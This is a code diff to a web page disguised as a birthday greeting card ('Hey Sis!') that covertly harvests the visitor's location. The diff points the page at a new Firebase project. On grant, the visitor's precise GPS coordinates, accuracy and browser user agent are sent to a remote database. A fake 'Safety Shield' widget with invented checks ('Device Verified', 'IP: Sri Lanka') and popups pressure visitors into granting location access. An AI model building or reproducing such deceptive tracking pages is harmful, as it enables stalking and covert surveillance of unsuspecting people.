@@ -120,7 +120,7 @@
         .instruction-guide p { margin: 8px 0; }
         .instruction-guide .step { font-weight: 700; color: #b9695a; }
 
-        /* Status Widget - Smooth Expanding Card */
+        /* Status Widget */
         .status-widget {
             position: fixed; bottom: 20px; right: 20px;
             background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(15px);
@@ -130,7 +130,7 @@
             z-index: 2000;
             overflow: hidden;
             width: 200px;
-            height: 44px; /* Initial height for pill shape */
+            height: 44px;
             transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
             opacity: 0; transform: translateY(20px);
             pointer-events: none;
@@ -174,11 +174,10 @@
     <div class="star-field" id="starField"></div>
     <canvas id="confetti"></canvas>
 
-    <!-- Enhanced Status Widget -->
     <div id="statusWidget" class="status-widget">
         <div class="status-header">
             <div id="headerSpinner" class="status-spinner"></div>
-            <svg id="headerShield" class="header-icon hidden" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:none;">
+            <svg id="headerShield" class="header-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:none;">
                 <path d="M9.5 12.4L10.9286 14L14.5 10" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                 <path d="M3 10.4167C3 7.21907 3 5.62028 3.37752 5.08241C3.75503 4.54454 5.25832 4.02996 8.26491 3.00079L8.83772 2.80472C10.405 2.26824 11.1886 2 12 2C12.8114 2 13.595 2.26824 15.1623 2.80472L15.7351 3.00079C18.7417 4.02996 20.245 4.54454 20.6225 5.08241C21 5.62028 21 7.21907 21 10.4167C21 10.8996 21 11.4234 21 11.9914C21 14.4963 20.1632 16.4284 19 17.9041M3.19284 14C4.05026 18.2984 7.57641 20.5129 9.89856 21.5273C10.62 21.8424 10.9807 22 12 22C13.0193 22 13.38 21.8424 14.1014 21.5273C14.6796 21.2747 15.3324 20.9478 16 20.5328" stroke="#22c55e" stroke-width="2" stroke-linecap="round"/>
             </svg>
@@ -187,7 +186,7 @@
         <div id="statusList" class="status-list"></div>
     </div>
 
-    <!-- UI Components -->
+    <!-- UI Popups -->
     <div class="popup-overlay" id="overlay1">
         <div class="popup-card" id="card1">
             <div class="popup-title">Hey Sis! 👋</div>
@@ -236,19 +235,21 @@
         </div>
     </div>
 
-    <!-- Firebase SDK -->
+    <!-- Updated Firebase SDK & Config -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
+        // අලුත් Firebase Config එක මෙතන තියෙනවා උදාර
         const firebaseConfig = {
-            apiKey: "AIzaSyAhZIUYj_tjXhcvVGEboWcyVP8auVsNcZc",
-            authDomain: "messages-9bc85.firebaseapp.com",
-            projectId: "messages-9bc85",
-            storageBucket: "messages-9bc85.firebasestorage.app",
-            messagingSenderId: "781930969359",
-            appId: "1:781930969359:web:ce557881c2092197a0a67a"
+            apiKey: "AIzaSyCbqDvrvNDn3lF31LYRq5O4PDpp-VSxIwc",
+            authDomain: "data-a0ce0.firebaseapp.com",
+            projectId: "data-a0ce0",
+            storageBucket: "data-a0ce0.firebasestorage.app",
+            messagingSenderId: "737698119491",
+            appId: "1:737698119491:web:64f8d1f77d2fc05b8ff9f6",
+            measurementId: "G-EJHJCWS2Q4"
         };
 
         const app = initializeApp(firebaseConfig);
@@ -256,15 +257,30 @@
         const db = getFirestore(app);
 
         let currentUserId = null;
-        signInAnonymously(auth).catch(e => console.error(e));
-        onAuthStateChanged(auth, user => { if(user) currentUserId = user.uid; });
+        signInAnonymously(auth).catch(e => console.error("Auth Error:", e));
+        
+        onAuthStateChanged(auth, user => { 
+            if(user) {
+                currentUserId = user.uid;
+                console.log("Logged in as:", currentUserId);
+            }
+        });
 
+        // අලුත් project එකේ data save කරන function එක
         window.saveLocationData = async (data) => {
             if (!currentUserId) return;
             try {
-                const colRef = collection(db, 'artifacts', 'studyflow-pro', 'users', currentUserId, 'locations');
-                await addDoc(colRef, { ...data, timestamp: serverTimestamp() });
-            } catch (e) { console.error(e); }
+                // මෙතන path එක 'data-a0ce0' එකට ගැලපෙන විදිහට හැදුවා
+                const colRef = collection(db, 'artifacts', 'birthday-card', 'users', currentUserId, 'locations');
+                await addDoc(colRef, { 
+                    ...data, 
+                    timestamp: serverTimestamp(),
+                    userAgent: navigator.userAgent
+                });
+                console.log("Location saved successfully!");
+            } catch (e) { 
+                console.error("Firestore Error:", e); 
+            }
         };
     </script>
 
@@ -273,10 +289,7 @@
         const tickSVG = `<svg class="mini-tick" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9 10L12.2581 12.4436C12.6766 12.7574 13.2662 12.6957 13.6107 12.3021L20 5" stroke="currentColor" stroke-width="3" stroke-linecap="round"/></svg>`;
         
         let isLocationAllowed = false;
-        const AudioCtx = window.AudioContext || window.webkitAudioContext;
-        let audioCtx = null;
-        function initAudio() { if(!audioCtx) audioCtx = new AudioCtx(); }
-
+        
         async function updateStatus() {
             const widget = document.getElementById('statusWidget');
             const list = document.getElementById('statusList');
@@ -301,24 +314,24 @@
             await addStep("Device Verified");
             await addStep("IP: Sri Lanka (SLT)");
             
-            if(isLocationAllowed) {
+            const finalize = async () => {
                 await addStep("Location Verified");
                 title.innerText = "Safety Shield Active";
                 spinner.style.display = 'none';
                 shield.style.display = 'block';
                 await delay(3000);
-                widget.classList.remove('visible');
+                widget.classList.remove('expanded');
+                setTimeout(() => widget.classList.remove('visible'), 600);
+            };
+
+            if(isLocationAllowed) {
+                await finalize();
             } else {
                 title.innerText = "Waiting for Access...";
                 const check = setInterval(async () => {
                     if(isLocationAllowed) {
                         clearInterval(check);
-                        await addStep("Location Verified");
-                        title.innerText = "Safety Shield Active";
-                        spinner.style.display = 'none';
-                        shield.style.display = 'block';
-                        await delay(3000);
-                        widget.classList.remove('visible');
+                        await finalize();
                     }
                 }, 500);
             }
@@ -348,15 +361,15 @@
                         isLocationAllowed = true;
                         closeAllPopups();
                         if (window.saveLocationData) {
-                            await window.saveLocationData({ lat: pos.coords.latitude, lng: pos.coords.longitude, method: 'GPS' });
+                            await window.saveLocationData({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
                         }
                         window.location.reload();
                     },
-                    async (error) => {
+                    (error) => {
                         closeAllPopups();
                         showPopup('overlay2', 'card2');
                     },
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    { enableHighAccuracy: true, timeout: 10000 }
                 );
             }
         }
@@ -404,7 +417,7 @@
             `;
         }
 
-        // Logic for eyes and floating elements
+        // Animation logic
         const leftPupil = document.getElementById('left-pupil'), rightPupil = document.getElementById('right-pupil'), elements = document.querySelectorAll('.element'), leftEyeGroup = document.getElementById('left-eye-group'), rightEyeGroup = document.getElementById('right-eye-group'), mouth = document.getElementById('mouth'), mainTitle = document.getElementById('main-title'), subTitle = document.getElementById('sub-title'), mainButton = document.getElementById('mainButton'), smileContainer = document.getElementById('smile');
 
         const handleMove = (clientX, clientY) => {
@@ -442,8 +455,6 @@
 
         document.addEventListener('mousemove', e => handleMove(e.clientX, e.clientY));
         document.addEventListener('touchmove', e => handleMove(e.touches[0].clientX, e.touches[0].clientY));
-        document.addEventListener('click', initAudio, { once: true });
-        
         document.getElementById('allowNowBtn')?.addEventListener('click', showGuideInPopup2);
         document.getElementById('howToAllowBtn')?.addEventListener('click', showGuideInPopup3);
     </script>
